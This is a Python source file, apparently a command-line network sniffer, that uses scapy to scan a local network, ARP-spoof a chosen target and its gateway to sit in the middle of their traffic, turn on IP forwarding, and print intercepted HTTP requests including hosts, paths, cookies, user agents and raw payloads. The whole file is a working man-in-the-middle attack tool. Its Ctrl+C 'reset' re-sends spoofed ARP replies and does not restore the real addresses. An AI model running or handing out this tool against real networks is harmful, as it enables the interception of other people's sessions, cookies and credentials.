import scapy.all as scapy
import scapy.layers.http as http
from scapy.all import ARP, Ether, srp
import argparse
import sys
import os
from rich import print
from rich.console import Console

console = Console()

def get_mac(ip):
    """Retrieve the MAC address of a given IP address."""
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None

def arp_spoof(target_ip, spoof_ip):
    """Send spoofed ARP responses to perform MITM."""
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(f"[bold red]Error:[/] Could not find MAC address for target IP: {target_ip}")
        sys.exit(1)

    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def sniff_packets(interface, method=None):
    """Sniff packets on the specified network interface."""
    try:
        scapy.sniff(iface=interface, store=False, prn=lambda packet: process_packet(packet, method))
    except OSError as e:
        print(f"[bold red]Error:[/] {e}")
        sys.exit(1)

def process_packet(packet, method=None):
    """Process and display information about sniffed packets."""
    if packet.haslayer(http.HTTPRequest):
        request = packet[http.HTTPRequest]
        ip = packet[scapy.IP].src
        mac = packet[scapy.Ether].src

        if method and request.Method.decode() != method:
            return

        print("\n[bold blue]HTTP Request:")
        print(f"    Method: [green]{request.Method}[/green]")
        print(f"    Host: [green]{request.Host}[/green]")
        print(f"    Path: [green]{request.Path}[/green]")
        print(f"    Source IP: [green]{ip}[/green]")
        print(f"    Source MAC: [green]{mac}[/green]")

        if request.Cookie:
            print(f"    Cookie: [green]{request.Cookie}[/green]")

        if request.User_Agent:
            print(f"    User-Agent: [green]{request.User_Agent}[/green]")

        if packet.haslayer(scapy.Raw):
            print("\n[bold red]Raw Payload:")
            print(f"[red]{packet[scapy.Raw].load}[/red]")

    if packet.haslayer(http.HTTPResponse):
        response = packet[http.HTTPResponse]
        print("\n[bold blue]HTTP Response:")
        print(f"    Status Code: [green]{response.Status_Code}[/green]")
        print(f"    Content Type: [green]{response.Content_Type}[/green]")
        print("\n" + "-" * 50)

def scan_network(target, iface):
    """Scan the network to identify active devices."""
    arp = ARP(pdst=target)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    try:
        result = srp(packet, timeout=3, verbose=0, iface=iface)[0]
    except PermissionError:
        print("[bold red]Error:[/] Insufficient privileges. Run the program with 'sudo'.")
        sys.exit()
    except OSError as e:
        print(f"[bold red]Error:[/] {e}")
        sys.exit()

    devices = []
    for sent, received in result:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})
    return devices

def main():
    """Main function to handle argument parsing and execution."""
    parser = argparse.ArgumentParser(description="Network Sniffer - Analyze network traffic in real time.")
    parser.add_argument("-t", "--target", dest="target_ip", help="Target IP address.")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Gateway IP address.")
    parser.add_argument("-i", "--interface", dest="interface", help="Network interface to use.")
    parser.add_argument("-tf", "--targetfind", dest="target_find", help="Target IP range to find devices.")
    parser.add_argument("--ip-forward", "-if", action="store_true", help="Enable packet forwarding.")
    parser.add_argument("-m", "--method", dest="method", help="Filter packets by HTTP method (e.g., GET, POST).")
    options = parser.parse_args()

    if options.target_find:
        devices = scan_network(options.target_find, options.interface)
        print("\n[bold green]Device Discovery:")
        print("**************************************")
        print("    IP Address       MAC Address")
        print("**************************************")
        for device in devices:
            print(f"    {device['ip']}       {device['mac']}")
        sys.exit(0)

    if not options.target_ip or not options.gateway_ip or not options.interface:
        parser.error("[-] Please specify the target IP, gateway IP, and interface.")

    if options.ip_forward:
        os.system("echo '1' > /proc/sys/net/ipv4/ip_forward")

    try:
        while True:
            arp_spoof(options.target_ip, options.gateway_ip)
            arp_spoof(options.gateway_ip, options.target_ip)
            print("\n[bold blue]Started Sniffing Packets...")
            sniff_packets(options.interface, options.method)
    except KeyboardInterrupt:
        print("\n[bold green]Detected Ctrl+C. Resetting ARP tables...")
        arp_spoof(options.gateway_ip, options.target_ip)
        arp_spoof(options.target_ip, options.gateway_ip)
        sys.exit(0)

if __name__ == "__main__":
    main()
